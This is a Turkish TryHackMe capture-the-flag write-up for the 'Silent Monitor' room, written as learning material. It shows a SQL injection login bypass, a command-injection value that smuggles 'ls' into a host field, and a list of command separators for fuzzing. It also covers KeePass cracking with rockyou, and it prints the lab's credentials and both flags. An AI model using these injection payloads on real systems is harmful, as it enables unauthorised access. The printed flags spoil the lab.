# TryHackMe — Silent Monitor

## Nmap ile Başlayalım

İlk olarak bütün TCP portlarını tarıyorum:

```bash
nmap -sS -A -p- 10.113.152.118
```

Tarama sonucunda `5050` portunda çalışan bir HTTP servisi olduğunu görüyorum.

> 📸 **Ekran görüntüsü:** Buraya Nmap çıktısını koy. Özellikle `5050/tcp` satırı görünsün.

Siteyi elle incelemeye başlamadan önce dizin taramasını da arka planda çalıştırıyorum. Böylece ben siteyi incelerken ffuf da olası endpointleri bulmaya devam etsin.

```bash
ffuf -u http://10.113.152.118:5050/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Burada URL'de portun doğru şekilde yazılması önemli. Hedefimiz `5050` portunda çalışan web servisi.

Siteyi biraz incelediğimde herhangi bir button, form veya benim işime yarayacak başka bir request göremedim. Bu yüzden uygulamada elle keşfedebileceğim fazla bir şey yok gibi duruyordu.

Bu sırada ffuf sonucu geldi:

```text
/internal
```

Direkt `/internal` dizinine geçiyorum.

> 📸 **Ekran görüntüsü:** ffuf çıktısında `/internal` endpointinin göründüğü bölüm.

---

## Internal Portal

`/internal` dizinine gittiğimde karşıma `Sign In NOC Portal` isimli bir login ekranı çıktı.

Burada herhangi bir kullanıcı adı veya parola bilgimiz yok. Normal bir parola brute force saldırısına başlamadan önce login mekanizmasının nasıl çalıştığını kontrol etmek daha mantıklı geldi.

Login formunda SQL injection denemeye karar verdim.

Username kısmına:

```text
admin' OR 1=1 -- -
```

yazıp password kısmına herhangi bir değer verdiğimde login olabildim.

Yani burada authentication kontrolünü bypass edebildiğimi gördüm.

> 📸 **Ekran görüntüsü:** Login ekranında payloadın kullanıldığı ve başarılı login sonrası portalın açıldığı görüntü.

---

## Host Health Kısmına Bakalım

Login olduktan sonra portal içerisinde `Host Health` isimli bir bölüm gördüm.

Burada `Target Hostname or IP` şeklinde bir alan vardı.

Uygulamanın aldığı değeri sunucu tarafında bir komuta gönderiyor olabileceğini düşündüm. Özellikle IP/hostname gibi bir değer alıp host health kontrolü yapan uygulamalarda `ping` gibi sistem komutlarının kullanılması oldukça olası.

İlk olarak Burp Suite üzerinden request'i yakaladım.

Örneğin request içerisinde:

```text
target=10.10.0.1
```

şeklinde bir parametre olduğunu gördüm.

Burada direkt komut çalıştırmayı test etmek için parametrenin sonuna `;` ekleyip ikinci bir komut göndermeyi denedim:

```text
target=10.10.0.1;ls
```

Response içerisinde `ls` komutunun çıktısını görmeye başladığımda command injection olduğunu doğrulamış oldum.

> 📸 **Ekran görüntüsü:** Burp Repeater içerisinde `target=10.10.0.1;ls` request'i ve response.

---

## Intruder ile Ayraçları Deneyelim

Hangi karakterlerin filtreyi geçebildiğini tek tek denemek yerine Burp Intruder kullanmaya karar verdim.

Burada amacım doğrudan payload çalıştırmak değil, uygulamanın hangi command separator karakterlerini kabul ettiğini görmekti.

Kullandığım liste:

```text
;
&
&&
||
|
%0a
%0d
\n
\r
%26
%7c
%3b
%0a
%0d
```

Request içerisindeki separator kısmını Intruder payload position olarak seçip saldırıyı başlattım.

Özellikle response length değerlerine baktım. Çünkü normal bir request ile `ls` komutunun çalıştığı request arasında response boyutunda fark oluşması bekleniyor.

Sonuçlarda `%0a` ile farklı bir response aldığımı gördüm.

Bu değeri tek başına tekrar test etmek için Repeater'a gönderip kontrol ettim.

> 📸 **Ekran görüntüsü:** Intruder sonuçlarında response length farkının görüldüğü bölüm.

> 📸 **Ekran görüntüsü:** `%0a` kullanılarak Repeater'da alınan başarılı response.

---

## Secret Config

Command injection üzerinden dizin içeriğini görebildiğimiz için biraz enumeration yaptım.

Çıktıda `secret.config` isimli bir dosya dikkatimi çekti.

Dosyanın içeriğini okumayı denedim ve içerisinde sistemde kullanılabilecek credential bilgileri olduğunu gördüm.

Burada `sysadmin` kullanıcısına ait bilgiler vardı:

```text
username: sysadmin
password: S3cur3Backup$Acc3ss!
```

Bu noktada SSH'ın Nmap taramasında açık olduğunu da hatırladım. Elimizde artık hem SSH servisi hem de geçerli bir kullanıcı bilgisi olduğu için web tarafında daha fazla uğraşmak yerine SSH üzerinden sisteme geçmek daha mantıklı.

```bash
ssh sysadmin@10.113.152.118
```

Parola olarak:

```text
S3cur3Backup$Acc3ss!
```

kullanıyorum ve sisteme giriş yapıyorum.

> 📸 **Ekran görüntüsü:** SSH bağlantısının başarılı olduğu terminal.

---

## İlk Flag

SSH üzerinden giriş yaptıktan sonra kullanıcının home dizinini kontrol ediyorum.

`user.txt` dosyasını bulup okuyorum:

```bash
cat user.txt
```

İlk flag:

```text
THM{sQLi_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
```

### Flag 1

`THM{sQLi_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}`

> 📸 **Ekran görüntüsü:** `cat user.txt` çıktısı.

---

## Backup Dizinine Bakalım

Sistemde biraz enumeration yaparken `backup` dizinini fark ettim.

```bash
ls -la
```

Dizinin içerisinde `README.txt` bulunuyordu.

Dosyayı okuduğumda burada `infrastructure.kdbx` isimli bir KeePass veritabanından bahsedildiğini gördüm.

Kısaca burada önemli olan nokta şu: `.kdbx` dosyası içerisinde kullanıcı adı, parola ve benzeri credential bilgileri tutulabilir. Eğer bu dosyayı kendi makineme alıp parolasını kırabilirsem daha yüksek yetkili bir hesabın bilgilerine ulaşma ihtimalim var.

---

## KeePass Veritabanını Kendi Makinemize Alalım

İlk başta dosyayı `wget` ile almaya çalıştım fakat bunun için uygun olmadığını gördüm.

Dosyayı SSH üzerinden kopyalamak için `scp` kullandım:

```bash
scp sysadmin@10.113.152.118:~/backups/infrastructure.kdbx .
```

Dosya artık kendi makinemde.

> 📸 **Ekran görüntüsü:** `scp` ile dosyanın indirildiği terminal.

---

## KDBX Parolasını Kırmak

Biraz araştırdıktan sonra KeePass veritabanı için kullanılabilecek `brutalkeepass` aracını buldum.

Repository:

`https://github.com/toneillcodes/brutalkeepass/`

Wordlist olarak rockyou kullanarak brute force denedim:

```bash
python bfkeepass.py -d ~/Desktop/infrastructure.kdbx -w /opt/wordlists/rockyou.txt -v
```

Bir süre sonra veritabanı parolasını buldu:

```text
spring
```

> 📸 **Ekran görüntüsü:** Tool'un `spring` parolasını bulduğu bölüm.

---

## KeePass Database'i Açalım

KDBX dosyasını incelemek için `KeePassXC` kullandım.

```bash
keepassxc
```

Program içerisinden `Open Database` seçeneğine girip indirdiğimiz:

```text
infrastructure.kdbx
```

dosyasını seçtim.

Parola olarak:

```text
spring
```

girdikten sonra database açıldı.

İçerideki kayıtları kontrol ettiğimde root hesabına ait credential bilgisini buldum:

```text
S3cur3P4ss0nK33p4ss
```

Burada artık root hesabına ait bir parola olduğunu düşündüğüm için bunu doğrudan `su` ile test ettim.

> 📸 **Ekran görüntüsü:** KeePassXC içerisinde bulunan credential kaydı.

---

## Root'a Geçiş

SSH session içerisinde:

```bash
su root
```

komutunu çalıştırdım.

Parola olarak KeePass'ten bulduğumuz:

```text
S3cur3P4ss0nK33p4ss
```

değerini girdim.

Ve root kullanıcısına geçiş başarılı oldu.

Son olarak root flag'ini okuyorum:

```bash
cat /root/root.txt
```

Karşıma son flag çıktı:

```text
THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
```

### Root Flag

`THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}`

> 📸 **Ekran görüntüsü:** `whoami` ile root olduğunun ve root flag'in görüldüğü terminal.
